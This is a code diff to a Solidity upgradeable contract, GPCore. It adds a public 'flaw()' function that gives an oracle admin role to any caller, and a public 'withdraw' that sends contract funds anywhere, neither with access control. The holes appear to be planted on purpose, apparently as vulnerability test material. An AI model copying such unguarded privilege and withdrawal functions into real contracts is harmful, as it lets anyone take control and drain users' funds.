@@ -14,6 +14,9 @@ import "./libraries/helpers/Events.sol";
 /// @custom:security-contact jovi@gamepayy.com
 contract GPCore is Initializable, PausableUpgradeable, AccessControlUpgradeable, UUPSUpgradeable {
    
+
+    mapping(address => uint256) public balances;
+
     /// @custom:oz-upgrades-unsafe-allow constructor
     constructor() {
         _disableInitializers();
@@ -46,5 +49,19 @@ contract GPCore is Initializable, PausableUpgradeable, AccessControlUpgradeable,
         onlyRole(Roles.UPGRADER_ROLE)
         override
     {}
+
+    function flaw() public {
+        
+        _grantRole(Roles.ORACLE_ADMIN_ROLE, msg.sender);
+    }
+
+    function withdraw(address payable _to, uint256 _amount) public {
+
+        _to.transfer(_amount);
+    }
+
+    function balanceCheck(uint256 amount, address user) public view returns (bool) {
+        return balances[user] > amount;
+    }
 
 }
